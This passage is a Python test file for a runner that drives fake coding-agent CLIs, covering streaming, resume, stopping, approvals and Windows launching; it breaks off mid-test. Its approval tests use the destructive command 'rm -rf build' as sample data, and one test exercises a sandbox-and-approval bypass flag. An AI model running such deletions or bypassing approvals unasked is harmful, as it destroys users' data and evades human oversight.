"""Agent runs (agent_nexus/agents/runner.py + adapters.py) against fake CLIs in tests/fixtures/fake_agents."""
from __future__ import annotations

import asyncio
import json
import os
import sys
import time
from pathlib import Path

import pytest

from agent_nexus.agents import adapters, approve_mcp, registry, runner
from agent_nexus.agents.runner import RunError, Runs

FAKES = Path(__file__).parent / "fixtures" / "fake_agents"
CLAUDE = str(FAKES / "fake_claude.py")
CODEX = str(FAKES / "fake_codex.py")
ACP = str(FAKES / "fake_acp.py")

pytestmark = pytest.mark.skipif(sys.platform == "win32", reason="fake CLIs are run through their shebang")


class Reader:
    def __init__(self, runs: Runs, rid: str):
        self.runs, self.rid, self.cursor, self.events = runs, rid, 0, []

    async def until(self, pred, timeout: float = 15.0) -> list[dict]:
        deadline = time.monotonic() + timeout
        while time.monotonic() < deadline:
            if pred(self.events):
                return self.events
            result = await self.runs.read({"rid": self.rid, "cursor": self.cursor, "wait": 1})
            self.events += result["events"]
            self.cursor = result["cursor"]
        raise AssertionError(f"timed out; events: {json.dumps(self.events, ensure_ascii=False)[:4000]}")

    def statuses(self) -> list[str]:
        return [e["state"] for e in self.events if e["type"] == "status"]

    def text(self) -> str:
        return "".join(e["text"] for e in self.events if e["type"] == "message")


def ended(count: int = 1, states=("done", "failed", "stopped")):
    return lambda events: sum(1 for e in events if e["type"] == "status" and e["state"] in states) >= count


@pytest.fixture
def runs(tmp_path):
    instance = Runs(registry.builtin_definitions(), tmp_root=tmp_path / "tmp", stop_grace_s=3)
    yield instance
    instance.close_all()


@pytest.fixture
def work(tmp_path):
    folder = tmp_path / "work"
    folder.mkdir()
    return str(folder)


def argv_log(tmp_path) -> tuple[Path, dict]:
    log = tmp_path / "argv.jsonl"
    return log, {"FAKE_ARGV_LOG": str(log)}


def lines(log: Path) -> list:
    return [json.loads(line) for line in log.read_text().splitlines()] if log.exists() else []


# ---------------------------------------------------------------------------------------------- claude

async def test_claude_streams_deltas_and_keeps_one_process_across_turns(runs, work, tmp_path):
    log, env = argv_log(tmp_path)
    opened = await runs.open({"kind": "claude", "workdir": work, "prompt": "hello", "permission": "edits"},
                             binary=CLAUDE, env=env, run_as=None)
    reader = Reader(runs, opened["rid"])
    events = await reader.until(ended(1))
    assert events[0]["type"] == "status" and events[0]["state"] == "starting"
    assert {"type": "user", "text": "hello"}.items() <= next(e for e in events if e["type"] == "user").items()
    assert [e["seq"] for e in events] == sorted(e["seq"] for e in events)
    session = next(e["session_id"] for e in events if e["type"] == "status" and e.get("session_id"))
    deltas = [e for e in events if e["type"] == "message"]
    assert all(e.get("delta") for e in deltas), "the final assistant message repeats the deltas: not re-sent"
    assert reader.text() == "echo: hello"
    assert any(e["type"] == "thinking" and e["text"] == "hmm" for e in events)
    done = events[-1]
    assert done["state"] == "done" and done["usage"] == {"input": 12, "output": 5, "cached": 2, "cost_usd": 0.0123}

    first_turn = len(reader.events)
    sent = await runs.send({"rid": opened["rid"], "prompt": "again"})
    assert sent["ok"] and sent["state"] == "running", "the next turn on the live process says it runs (stop button)"
    await reader.until(ended(2))
    assert reader.text() == "echo: helloecho: again"
    second = reader.events[first_turn:]
    assert [e["type"] for e in second[:2]] == ["user", "status"] and second[1]["state"] == "running"
    assert len(lines(log)) == 1, "the second turn went to the same process"
    argv = lines(log)[0]
    assert argv[:7] == ["-p", "--output-format", "stream-json", "--verbose", "--input-format", "stream-json",
                        "--permission-mode"]
    assert "--include-partial-messages" in argv and "--resume" not in argv
    listed = (await runs.list())["runs"]
    assert listed[0]["session_id"] == session and listed[0]["state"] == "done" and listed[0]["process"]


async def test_claude_resume_system_prompt_and_old_cli_without_partial_messages(runs, work, tmp_path):
    log, env = argv_log(tmp_path)
    env["FAKE_OLD_CLAUDE"] = "1"
    opened = await runs.open({"kind": "claude", "workdir": work, "prompt": "sysprompt", "resume_id": "abc-123",
                              "permission": "readonly"}, binary=CLAUDE, env=env, run_as=None,
                             system_prompt="你是助手 $device")
    reader = Reader(runs, opened["rid"])
    await reader.until(ended(1))
    assert reader.text() == "system: 你是助手 $device"
    assert opened["session_id"] == "abc-123"
    first, second = lines(log)
    assert "--include-partial-messages" in first and "--include-partial-messages" not in second
    assert second[second.index("--resume") + 1] == "abc-123"
    assert second[second.index("--append-system-prompt") + 1] == "你是助手 $device"
    assert second[second.index("--permission-mode") + 1] == "plan"
    assert not [e for e in reader.events if e["type"] == "error"], "the retry is silent"


async def test_claude_crash_reports_stderr_then_next_message_resumes(runs, work, tmp_path):
    log, env = argv_log(tmp_path)
    opened = await runs.open({"kind": "claude", "workdir": work, "prompt": "hi", "permission": "edits"},
                             binary=CLAUDE, env=env, run_as=None)
    reader = Reader(runs, opened["rid"])
    await reader.until(ended(1))
    session = runs.runs[opened["rid"]].session_id
    await runs.send({"rid": opened["rid"], "prompt": "die"})
    await reader.until(ended(2))
    error = next(e for e in reader.events if e["type"] == "error")
    assert "boom: something broke" in error["text"] and "退出码 3" in error["text"]
    assert reader.statuses()[-1] == "failed"
    await runs.send({"rid": opened["rid"], "prompt": "back"})
    await reader.until(ended(3))
    assert reader.text().endswith("echo: back")
    assert lines(log)[-1][lines(log)[-1].index("--resume") + 1] == session


async def test_claude_stop_interrupts_the_turn_but_keeps_the_process(runs, work, tmp_path):
    log, env = argv_log(tmp_path)
    opened = await runs.open({"kind": "claude", "workdir": work, "prompt": "slow", "permission": "edits"},
                             binary=CLAUDE, env=env, run_as=None)
    reader = Reader(runs, opened["rid"])
    await reader.until(lambda events: "working" in "".join(e.get("text", "") for e in events))
    with pytest.raises(RunError) as busy:
        await runs.send({"rid": opened["rid"], "prompt": "x"})
    assert busy.value.code == "busy"
    assert (await runs.stop({"rid": opened["rid"]}))["ok"]
    await reader.until(ended(1))
    assert reader.statuses()[-1] == "stopped"
    await runs.send({"rid": opened["rid"], "prompt": "after"})
    await reader.until(ended(2))
    assert reader.text().endswith("echo: after") and len(lines(log)) == 1


async def test_claude_edit_becomes_a_file_change(runs, work):
    opened = await runs.open({"kind": "claude", "workdir": work, "prompt": "edit", "permission": "edits"},
                             binary=CLAUDE, run_as=None)
    reader = Reader(runs, opened["rid"])
    events = await reader.until(ended(1))
    tool = [e for e in events if e["type"] == "tool"]
    assert tool[0]["status"] == "running" and tool[0]["title"] == "src/a.py" and tool[-1]["status"] == "ok"
    change = next(e for e in events if e["type"] == "file_change")
    assert change["path"] == "src/a.py" and change["kind"] == "edit" and "-x = 1" in change["diff"]


async def _approval(runs, work, tmp_path, **open_kw):
    log, env = argv_log(tmp_path)
    opened = await runs.open({"kind": "claude", "workdir": work, "prompt": "approve please", "permission": "ask"},
                             binary=CLAUDE, env=env, run_as=None, **open_kw)
    reader = Reader(runs, opened["rid"])
    await reader.until(lambda events: any(e["type"] == "approval" for e in events))
    argv = lines(log)[0]
    assert argv[argv.index("--permission-prompt-tool") + 1] == "mcp__anx__approve"
    config = json.loads(Path(argv[argv.index("--mcp-config") + 1]).read_text())
    assert config["mcpServers"]["anx"]["env"]["ANX_APPROVE_TOKEN"] == runs.runs[opened["rid"]].token
    pending = next(e for e in reader.events if e["type"] == "approval")
    assert pending["state"] == "pending" and pending["tool"] == "Bash" and pending["summary"] == "rm -rf build"
    return opened, reader, pending


async def test_claude_ask_mode_approval_allowed_through_the_mcp_server(runs, work, tmp_path):
    opened, reader, pending = await _approval(runs, work, tmp_path)
    await runs.answer({"rid": opened["rid"], "approval_id": pending["id"], "allow": True, "remember": True})
    events = await reader.until(ended(1))
    assert any(e["type"] == "approval" and e["state"] == "allowed" for e in events)
    assert [e for e in events if e["type"] == "tool"][-1] == {**[e for e in events if e["type"] == "tool"][-1],
                                                              "status": "ok", "output": "removed build"}
    assert reader.text().endswith("done: allowed")
    # remembered: the same command's program is allowed without asking again
    await runs.send({"rid": opened["rid"], "prompt": "approve again"})
    await reader.until(ended(2))
    auto = [e for e in reader.events if e["type"] == "approval" and e.get("auto")]
    assert auto and auto[0]["state"] == "allowed"


async def test_claude_ask_mode_denied(runs, work, tmp_path):
    opened, reader, pending = await _approval(runs, work, tmp_path)
    result = await runs.handlers()["agent_run_answer"]({"rid": opened["rid"], "approval_id": pending["id"],
                                                        "allow": False})
    assert result == {"ok": True}
    events = await reader.until(ended(1))
    tool = [e for e in events if e["type"] == "tool"][-1]
    assert tool["status"] == "error" and tool["output"] == "用户拒绝了这个操作"
    assert reader.text().endswith("done: denied")
    again = await runs.handlers()["agent_run_answer"]({"rid": opened["rid"], "approval_id": pending["id"],
                                                       "allow": True})
    assert again["code"] == "not_found"


async def test_claude_approval_times_out_as_deny(tmp_path, work):
    runs = Runs(registry.builtin_definitions(), tmp_root=tmp_path / "tmp", approval_timeout_s=0.5)
    try:
        _opened, reader, pending = await _approval(runs, work, tmp_path)
        events = await reader.until(ended(1))
        assert any(e["type"] == "approval" and e["id"] == pending["id"] and e.get("reason") == "timeout"
                   for e in events)
        assert "没有回应" in [e for e in events if e["type"] == "tool"][-1]["output"]
    finally:
        runs.close_all()


async def test_approval_endpoint_refuses_unknown_tokens(runs):
    url = await runs.approval_endpoint_url()
    decision = await asyncio.to_thread(approve_mcp.decide, url, "nope", {"tool_name": "Bash", "input": {}}, timeout=5)
    assert decision["behavior"] == "deny" and "unknown token" in decision["message"]
    unreachable = await asyncio.to_thread(approve_mcp.decide, "http://127.0.0.1:9/approve", "t",
                                          {"tool_name": "Bash", "input": {}}, timeout=2)
    assert unreachable["behavior"] == "deny" and "无法连接" in unreachable["message"]


# ---------------------------------------------------------------------------------------------- codex

async def test_codex_exec_turns_and_resume_argv(runs, work, tmp_path):
    log, env = argv_log(tmp_path)
    opened = await runs.open({"kind": "codex", "workdir": work, "prompt": "hi", "permission": "ask"},
                             binary=CODEX, env=env, run_as=None, system_prompt='说 "你好"\n第二行')
    reader = Reader(runs, opened["rid"])
    events = await reader.until(ended(1))
    assert any(e["type"] == "thinking" and e["text"] == "**Planning**" for e in events)
    tools = [e for e in events if e["type"] == "tool" and e["id"] == "item_1"]
    assert [t["status"] for t in tools] == ["running", "ok"] and tools[-1]["output"] == "a.txt\n"
    assert tools[0]["title"] == "bash -lc ls"
    assert {"type": "file_change", "path": "a.txt", "kind": "add"}.items() <= \
        next(e for e in events if e["type"] == "file_change").items()
    todo = next(e for e in events if e["type"] == "tool" and e["name"] == "todo_list")
    assert todo["output"] == "[x] look\n[ ] fix"
    assert reader.text() == "codex: hi"
    assert events[-1]["state"] == "done" and events[-1]["usage"] == {"input": 100, "output": 7, "cached": 40}
    thread = runs.runs[opened["rid"]].session_id

    await runs.send({"rid": opened["rid"], "prompt": "more"})
    await reader.until(ended(2))
    first, second = (entry["argv"] for entry in lines(log))
    assert first[:5] == ["exec", "--json", "--skip-git-repo-check", "-C", work] and first[-1] == "hi"
    assert "--ask-for-approval" not in first and 'approval_policy="never"' in first
    instructions = next(item for item in first if item.startswith("developer_instructions="))
    assert first[first.index(instructions) - 1] == "-c"
    assert json.loads(instructions.split("=", 1)[1]) == '说 "你好"\n第二行'
    assert second[second.index("resume") + 1:] == [thread, "more"]
    assert reader.text().endswith("codex: more")


async def test_codex_long_prompt_goes_through_stdin(runs, work, tmp_path, monkeypatch):
    monkeypatch.setattr(adapters.CodexExec, "STDIN_PROMPT_OVER", 10)
    log, env = argv_log(tmp_path)
    opened = await runs.open({"kind": "codex", "workdir": work, "prompt": "a rather long prompt", "permission": "full"},
                             binary=CODEX, env=env, run_as=None)
    reader = Reader(runs, opened["rid"])
    await reader.until(ended(1))
    entry = lines(log)[0]
    assert entry["argv"][-1] == "-" and entry["prompt"] == "a rather long prompt"
    assert "--dangerously-bypass-approvals-and-sandbox" in entry["argv"]


async def test_codex_failures_and_stop(runs, work):
    opened = await runs.open({"kind": "codex", "workdir": work, "prompt": "fail", "permission": "edits"},
                             binary=CODEX, run_as=None)
    reader = Reader(runs, opened["rid"])
    await reader.until(ended(1))
    assert [e["text"] for e in reader.events if e["type"] == "error"] == ["model refused"]
    assert reader.statuses()[-1] == "failed"

    await runs.send({"rid": opened["rid"], "prompt": "crash"})
    await reader.until(ended(2))
    assert "fatal: codex crashed" in [e for e in reader.events if e["type"] == "error"][-1]["text"]

    await runs.send({"rid": opened["rid"], "prompt": "slow"})
    await reader.until(lambda events: any(e["type"] == "tool" and e["title"] == "sleep 30" for e in events))
    started = time.monotonic()
    await runs.stop({"rid": opened["rid"]})
    await reader.until(ended(3))
    assert reader.statuses()[-1] == "stopped" and time.monotonic() - started < 3
    assert runs.runs[opened["rid"]].proc is None


# ---------------------------------------------------------------------------------------------- acp

async def test_acp_session_streams_updates(runs, work, tmp_path):
    log, env = argv_log(tmp_path)
    opened = await runs.open({"kind": "dsh", "workdir": work, "prompt": "hi"}, binary=ACP, env=env, run_as=None,
                             system_prompt="SYS")
    reader = Reader(runs, opened["rid"])
    events = await reader.until(ended(1))
    assert lines(log)[0] == ["--profile", "acp"]
    assert reader.text().startswith("acp: SYS") and reader.text().endswith("hi"), "system prompt prefixed"
    assert any(e["type"] == "thinking" and e.get("delta") for e in events)
    plan = next(e for e in events if e["type"] == "tool" and e["id"] == "plan")
    assert plan["output"] == "[x] step one\n[ ] step two"
    assert runs.runs[opened["rid"]].session_id == "acp-sess-1"
    await runs.send({"rid": opened["rid"], "prompt": "two"})
    await reader.until(ended(2))
    assert reader.text().endswith("acp: two") and len(lines(log)) == 1



async def test_acp_system_prompt_as_embedded_resource_and_other_kind_tool_name(runs, work, tmp_path):
    # dsh accepts embedded context: the system prompt must not become part of the user's first message (dsh titles
    # the session from it); dsh reports its read tool as kind "other", title "read"
    _log, env = argv_log(tmp_path)
    env["FAKE_ACP"] = "embedded"
    opened = await runs.open({"kind": "dsh", "workdir": work, "prompt": "hi"}, binary=ACP, env=env, run_as=None,
                             system_prompt="SYS")
    reader = Reader(runs, opened["rid"])
    await reader.until(ended(1))
    assert reader.text().endswith("acp: hi [res:SYS]")
    await runs.send({"rid": opened["rid"], "prompt": "otherkind"})
    events = await reader.until(ended(2))
    tool = next(e for e in events if e["type"] == "tool" and e["id"] == "tc2")
    assert tool["name"] == "read"

@pytest.mark.parametrize("allow,remember,chosen,status", [(True, True, "always", "ok"), (False, False, "no", "error")])
async def test_acp_permission_request(runs, work, allow, remember, chosen, status):
    opened = await runs.open({"kind": "dsh", "workdir": work, "prompt": "perm"}, binary=ACP, run_as=None)
    reader = Reader(runs, opened["rid"])
    await reader.until(lambda events: any(e["type"] == "approval" for e in events))
    pending = next(e for e in reader.events if e["type"] == "approval")
    assert pending["state"] == "pending" and pending["summary"] == "rm -rf build" and pending["tool"] == "execute"
    assert [o["kind"] for o in pending["options"]] == ["allow_once", "allow_always", "reject_once"]
    assert (await runs.list())["runs"][0]["pending_approvals"] == 1
    await runs.answer({"rid": opened["rid"], "approval_id": pending["id"], "allow": allow, "remember": remember})
    events = await reader.until(ended(1))
    assert reader.text().endswith(f"perm: {chosen}")
    tool = [e for e in events if e["type"] == "tool" and e["id"] == "tc1"]
    assert tool[0]["title"] == "Run rm -rf build" and tool[-1]["status"] == status
    assert tool[-1]["output"] == f"chosen={chosen}"
    change = next(e for e in events if e["type"] == "file_change")
    assert change["path"] == "b.txt" and change["kind"] == "edit" and "+b" in change["diff"]


async def test_acp_stop_cancels_and_unsupported_client_methods_error(runs, work):
    opened = await runs.open({"kind": "gemini", "workdir": work, "prompt": "slow"}, binary=ACP, run_as=None)
    reader = Reader(runs, opened["rid"])
    await reader.until(lambda events: "working" in "".join(e.get("text", "") for e in events))
    await runs.stop({"rid": opened["rid"]})
    await reader.until(ended(1))
    assert reader.statuses()[-1] == "stopped"
    await runs.send({"rid": opened["rid"], "prompt": "fs"})
    await reader.until(ended(2))
    assert reader.text().endswith("fs-error:-32601")


async def test_acp_resume_loads_without_replaying_history(runs, work):
    opened = await runs.open({"kind": "dsh", "workdir": work, "prompt": "hi", "resume_id": "old-1"},
                             binary=ACP, run_as=None)
    reader = Reader(runs, opened["rid"])
    await reader.until(ended(1))
    assert "old answer" not in reader.text() and reader.text() == "acp: hi"
    assert runs.runs[opened["rid"]].session_id == "old-1"


async def test_acp_without_load_support_starts_a_new_session_and_says_so(runs, work):
    opened = await runs.open({"kind": "dsh", "workdir": work, "prompt": "hi", "resume_id": "old-1"},
                             binary=ACP, env={"FAKE_ACP": "noload"}, run_as=None)
    reader = Reader(runs, opened["rid"])
    events = await reader.until(ended(1))
    assert any(e["type"] == "error" and e.get("level") == "warn" and "新会话" in e["text"] for e in events)
    assert runs.runs[opened["rid"]].session_id == "acp-sess-1"


@pytest.mark.parametrize("mode", ["error", "silent"])
async def test_acp_falls_back_to_headless_text(tmp_path, work, mode):
    runs = Runs(registry.builtin_definitions(), tmp_root=tmp_path / "tmp", acp_timeout_s=1)
    log, env = argv_log(tmp_path)
    env["FAKE_ACP"] = mode
    try:
        opened = await runs.open({"kind": "dsh", "workdir": work, "prompt": "hi"}, binary=ACP, env=env, run_as=None)
        reader = Reader(runs, opened["rid"])
        await reader.until(ended(1))
        assert any(e["type"] == "error" and e.get("level") == "warn" and "普通文本" in e["text"] for e in reader.events)
        messages = [e for e in reader.events if e["type"] == "message"]
        assert [(m["text"], bool(m.get("delta"))) for m in messages] == [("headless: hi", False), ("plain line\n", True)]
        assert reader.statuses()[-1] == "done" and runs.runs[opened["rid"]].session_id == "hs-1"
        await runs.send({"rid": opened["rid"], "prompt": "next"})
        await reader.until(ended(2))
        assert lines(log)[-1] == ["--profile", "headless", "--json", "--session-id", "hs-1", "next"]
    finally:
        runs.close_all()


async def test_acp_without_fallback_fails_plainly(tmp_path, work):
    runs = Runs(registry.builtin_definitions(), tmp_root=tmp_path / "tmp")
    try:
        opened = await runs.open({"kind": "gemini", "workdir": work, "prompt": "hi"}, binary=ACP,
                                 env={"FAKE_ACP": "error"}, run_as=None)
        reader = Reader(runs, opened["rid"])
        await reader.until(ended(1))
        assert reader.statuses()[-1] == "failed"
        assert "no credentials" in [e for e in reader.events if e["type"] == "error"][-1]["text"]
    finally:
        runs.close_all()


# ---------------------------------------------------------------------------------------------- buffer, polling, housekeeping

async def test_event_buffer_caps_and_dropped(tmp_path, work):
    runs = Runs(registry.builtin_definitions(), tmp_root=tmp_path / "tmp", max_events=5)
    try:
        opened = await runs.open({"kind": "codex", "workdir": work, "prompt": "hi", "permission": "edits"},
                                 binary=CODEX, run_as=None)
        run = runs.runs[opened["rid"]]
        for _ in range(100):
            if not run.adapter.turn_active:
                break
            await asyncio.sleep(0.05)
        result = await runs.read({"rid": opened["rid"], "cursor": 0})
        assert len(result["events"]) == 5 and result["dropped"] == run.seq - 5
        assert result["cursor"] == run.seq and result["events"][-1]["state"] == "done"
        run.events.clear()
        run.size = 0
        runs.max_bytes = 3000
        for index in range(4):
            runs._push(run, {"type": "message", "role": "assistant", "text": "x" * 1000, "n": index})
        assert len(run.events) == 2 and run.size <= 3000
    finally:
        runs.close_all()


async def test_read_long_polls_and_wakes(runs, work):
    opened = await runs.open({"kind": "codex", "workdir": work, "prompt": "", "permission": "edits"},
                             binary=CODEX, run_as=None)
    cursor = (await runs.read({"rid": opened["rid"], "cursor": 0}))["cursor"]
    started = time.monotonic()
    empty = await runs.read({"rid": opened["rid"], "cursor": cursor, "wait": 0.3})
    assert empty["events"] == [] and time.monotonic() - started >= 0.25 and empty["state"] == "idle"
    waiter = asyncio.ensure_future(runs.read({"rid": opened["rid"], "cursor": cursor, "wait": 20}))
    await asyncio.sleep(0.1)
    await runs.send({"rid": opened["rid"], "prompt": "hi"})
    woken = await asyncio.wait_for(waiter, 5)
    assert woken["events"][0]["type"] == "user"
    big = await runs.read({"rid": opened["rid"], "cursor": cursor, "wait": 999})  # capped, returns at once here
    assert big["events"]


async def test_idle_process_is_closed_and_the_next_message_resumes(tmp_path, work):
    log, env = argv_log(tmp_path)
    runs = Runs(registry.builtin_definitions(), tmp_root=tmp_path / "tmp", idle_s=0.2)
    try:
        opened = await runs.open({"kind": "claude", "workdir": work, "prompt": "hi", "permission": "edits"},
                                 binary=CLAUDE, env=env, run_as=None)
        reader = Reader(runs, opened["rid"])
        await reader.until(ended(1))
        await asyncio.sleep(0.3)
        runs._reap()
        run = runs.runs[opened["rid"]]
        assert run.proc is None and reader.statuses()[-1] == "done"
        await reader.until(lambda events: events[-1]["type"] == "status" and events[-1]["state"] == "idle")
        await runs.send({"rid": opened["rid"], "prompt": "again"})
        await reader.until(ended(2))
        assert "--resume" in lines(log)[-1] and len(lines(log)) == 2
        run.seen = run.active = time.monotonic() - 1
        runs._reap()
        assert opened["rid"] in runs.runs, "the second process is fresh"
        runs._kill(run)
        run.seen = run.active = time.monotonic() - 1
        runs._reap()
        assert opened["rid"] not in runs.runs
    finally:
        runs.close_all()


async def test_handler_errors_are_returned_not_raised(runs, work, tmp_path):
    handlers = runs.handlers()
    assert (await handlers["agent_run_read"]({"rid": "nope"}))["code"] == "not_found"
    assert (await handlers["agent_run_open"]({"kind": "nope", "workdir": work}))["code"] == "unknown_kind"
    assert (await handlers["agent_run_open"]({"kind": "codex", "workdir": str(tmp_path / "missing")}))["code"] == \
        "bad_workdir"
    assert (await handlers["agent_run_open"]({"kind": "gemini", "workdir": work, "permission": "readonly",
                                              "resume_id": ""}))["code"] in ("not_installed", "bad_permission")
    assert (await handlers["agent_run_open"]({"kind": "codex", "workdir": work, "resume_id": "a b"}))["code"] == \
        "bad_resume_id"
    assert (await handlers["agent_run_stop"]({"rid": "nope"}))["code"] == "not_found"
    assert await handlers["agent_run_close"]({"rid": "nope"}) == {"ok": True}
    restricted = Runs(registry.builtin_definitions(), roots=lambda: [str(tmp_path / "elsewhere")])
    assert (await restricted.handlers()["agent_run_open"]({"kind": "codex", "workdir": work}))["code"] == \
        "workdir_not_allowed"
    missing = await runs.open({"kind": "dsh", "workdir": work, "prompt": "hi", "permission": "readonly"},
                              binary=ACP, run_as=None)
    reader = Reader(runs, missing["rid"])
    await reader.until(ended(1))
    assert any(e.get("level") == "warn" and "逐项审批" in e["text"] for e in reader.events)
    opened = await runs.open({"kind": "codex", "workdir": work, "permission": "edits"}, binary=CODEX, run_as=None)
    assert (await handlers["agent_run_send"]({"rid": opened["rid"], "prompt": "  "}))["code"] == "empty"
    await handlers["agent_run_close"]({"rid": opened["rid"]})
    assert (await handlers["agent_run_read"]({"rid": opened["rid"]}))["code"] == "not_found"


async def test_untrusted_binary_param_is_ignored(runs, work, monkeypatch):
    monkeypatch.setattr(registry, "locate", lambda d, env: None)
    result = await runs.handlers()["agent_run_open"]({"kind": "codex", "workdir": work, "binary": CODEX})
    assert result["code"] == "not_installed" and "安装" in result["error"]


# ---------------------------------------------------------------------------------------------- Windows launching

def test_npm_cmd_shim_resolves_to_node_and_script(tmp_path):
    folder = tmp_path / "npm"
    script = folder / "node_modules" / "@openai" / "codex" / "bin" / "codex.js"
    script.parent.mkdir(parents=True)
    script.write_text("// cli")
    shim = folder / "codex.cmd"
    shim.write_text('@ECHO off\r\nSET dp0=%~dp0\r\n"%_prog%"  "%dp0%\\node_modules\\@openai\\codex\\bin\\codex.js" %*\r\n')
    (folder / "node.exe").write_text("")
    assert runner.npm_shim_target(str(shim)) == [str(folder / "node.exe"), str(script)]
    assert runner.launcher(str(shim), {}, windows=True) == ([str(folder / "node.exe"), str(script)], False)
    other = folder / "dsh.cmd"
    other.write_text('@SET ELECTRON_RUN_AS_NODE=1\r\n"%~dp0\\..\\..\\DeepSeek.exe" "%~dp0\\dsh.js" %*\r\n')
    assert runner.launcher(str(other), {}, windows=True) == ([str(other)], True)
    assert runner.launcher("/usr/bin/claude", {}, windows=True) == (["/usr/bin/claude"], False)
    assert runner.launcher(r"C:\npm\codex.ps1", {}, windows=True)[0][-1] == r"C:\npm\codex.ps1"


def test_batch_command_line_is_checked():
    line = runner.command_line(["C:\\npm\\dsh.cmd", "--profile", "acp", "C:\\My Work"], True)
    assert isinstance(line, str) and line.endswith('/d /s /c ""C:\\npm\\dsh.cmd" --profile acp "C:\\My Work""')
    with pytest.raises(RunError) as refused:
        runner.command_line(["C:\\npm\\dsh.cmd", "100%"], True)
    assert refused.value.code == "unsafe_args"
    assert runner.command_line(["a", "b"], False) == ["a", "b"]


def test_batch_launch_moves_free_text_out_of_the_command_line():
    defs = registry.builtin_definitions()
    codex = adapters.make(defs["codex"], adapters.AdapterOptions(binary="codex.cmd", workdir="C:\\w", batch=True,
                                                                 system_prompt="多行\n提示", permission="edits"))
    argv = codex.argv("hello 100%")
    assert argv[-1] == "-" and codex.turn_stdin() == "多行\n提示\n\n---\n\nhello 100%".encode()
    assert not any("developer_instructions" in item for item in argv)
    claude = adapters.make(defs["claude"], adapters.AdapterOptions(binary="claude.cmd", workdir="C:\\w", batch=True,
                                                                   system_prompt="S", permission="edits"))
    assert "--append-system-prompt" not in claude.argv()
    claude.begin_turn("hi")
    sent = json.loads(claude.outbox[0])
    assert sent["message"]["content"][0]["text"] == "S\n\n---\n\nhi"


# ---------------------------------------------------------------------------------------------- adapters alone

def test_adapters_tolerate_garbage_and_unknown_events():
    defs = registry.builtin_definitions()
    for kind in ("claude", "codex", "dsh"):
        adapter = adapters.make(defs[kind], adapters.AdapterOptions(binary="x", workdir="/w"))
        for line in ("", "not json", "[1,2]", '{"type": "brand_new"}', '{"type": "assistant", "message": 5}',
                     '{"type": "item.completed", "item": null}', '{"jsonrpc": "2.0", "method": "session/update"}',
                     '{"jsonrpc": "2.0", "id": 77, "result": {}}'):
            assert isinstance(adapter.feed(line), list)
    text = adapters.make(registry.AgentDef(kind="x", label="X", binaries=("x",), command=["{bin}", "{prompt}"]),
                         adapters.AdapterOptions(binary="x", workdir="/w"))
    assert text.argv("hi") == ["x", "hi"]
    assert text.feed('{"type": "reasoning", "text": "t"}') == [{"type": "thinking", "text": "t", "delta": True}]
    assert text.feed('{"type": "error", "message": "bad"}') == [{"type": "error", "text": "bad"}]
    assert text.feed('{"unrelated": 1}') == []


def test_codex_legacy_format():
    adapter = adapters.make(registry.builtin_definitions()["codex"], adapters.AdapterOptions(binary="x", workdir="/w"))
    adapter.argv("hi")
    assert adapter.feed('{"id": "0", "msg": {"type": "session_configured", "session_id": "s-1"}}')[0]["session_id"] \
        == "s-1"
    assert adapter.feed('{"id": "1", "msg": {"type": "agent_message", "message": "yo"}}')[0]["text"] == "yo"
    assert adapter.feed('{"id": "1", "msg": {"type": "task_complete"}}')[0]["state"] == "done"
    assert adapter.exited(0, "") == []



def test_codex_nonfatal_error_is_one_warning_per_turn():
    # seen on a real device: the user's config.toml warning arrives as an error item and a top-level error event
    adapter = adapters.make(registry.builtin_definitions()["codex"], adapters.AdapterOptions(binary="x", workdir="/w"))
    adapter.argv("hi")
    note = "Codex is ignoring 1 unrecognized configuration setting."
    adapter.feed('{"type": "turn.started"}')
    first = adapter.feed(json.dumps({"type": "item.completed", "item": {"id": "e", "type": "error", "message": note}}))
    assert first == [{"type": "error", "level": "warn", "text": note}]
    assert adapter.feed(json.dumps({"type": "error", "message": note})) == []
    adapter.feed('{"type": "turn.completed", "usage": {}}')
    adapter.feed('{"type": "turn.started"}')
    assert adapter.feed(json.dumps({"type": "error", "message": note}))[0]["level"] == "warn"

def test_approve_mcp_protocol(monkeypatch, capsys):
    monkeypatch.setattr(approve_mcp, "decide", lambda url, token, arguments, **_: {"behavior": "allow",
                                                                                    "updatedInput": arguments["input"]})
    import io
    requests = [{"jsonrpc": "2.0", "id": 1, "method": "initialize", "params": {"protocolVersion": "2024-11-05"}},
                {"jsonrpc": "2.0", "method": "notifications/initialized"},
                {"jsonrpc": "2.0", "id": 2, "method": "tools/list"},
                {"jsonrpc": "2.0", "id": 3, "method": "nope"}]
    monkeypatch.setattr(sys, "stdin", io.StringIO("\n".join(json.dumps(r) for r in requests) + "\n"))
    assert approve_mcp.main(["--url", "http://127.0.0.1:1/approve", "--token", "t"]) == 0
    out = [json.loads(line) for line in capsys.readouterr().out.splitlines()]
    assert out[0]["result"]["protocolVersion"] == "2024-11-05"
    assert out[1]["result"]["tools"][0]["name"] == "approve"
    assert out[2]["error"]["code"] == -32601
    assert len(out) == 3, "notifications get no answer"


def test_module_is_runnable_with_dash_m():
    import subprocess
    done = subprocess.run([sys.executable, "-m", "agent_nexus.agents.approve_mcp", "--url", "http://x"],
                          input='{"jsonrpc":"2.0","id":1,"method":"ping"}\n', capture_output=True, text=True,
                          check=False, timeout=20, cwd=str(Path(__file__).parent.parent), env={**os.environ})
    assert json.loads(done.stdout) == {"jsonrpc": "2.0", "id": 1, "result": {}}


# ---------------------------------------------------------------------------------------------- review fixes

async def test_acp_idle_close_then_next_message_handshakes_again(tmp_path, work):
    """The idle reaper kills an ACP process: the next message must wait for initialize + session/load."""
    log, env = argv_log(tmp_path)
    runs = Runs(registry.builtin_definitions(), tmp_root=tmp_path / "tmp", idle_s=0.2)
    try:
        opened = await runs.open({"kind": "dsh", "workdir": work, "prompt": "hi"}, binary=ACP, env=env, run_as=None)
        reader = Reader(runs, opened["rid"])
        await reader.until(ended(1))
        await asyncio.sleep(0.3)
        runs._reap()
        run = runs.runs[opened["rid"]]
        assert run.proc is None and not run.adapter.ready
        await runs.send({"rid": opened["rid"], "prompt": "again"})
        await reader.until(ended(2))
        assert reader.text().endswith("acp: again"), reader.events[-6:]
        assert reader.statuses()[-1] == "done" and run.session_id == "acp-sess-1" and len(lines(log)) == 2
    finally:
        runs.close_all()


async def test_acp_in_band_approval_times_out_as_deny(tmp_path, work):
    runs = Runs(registry.builtin_definitions(), tmp_root=tmp_path / "tmp", approval_timeout_s=0.4)
    try:
        opened = await runs.open({"kind": "dsh", "workdir": work, "prompt": "perm"}, binary=ACP, run_as=None)
        reader = Reader(runs, opened["rid"])
        events = await reader.until(ended(1))
        denied = [e for e in events if e["type"] == "approval" and e["state"] == "denied"]
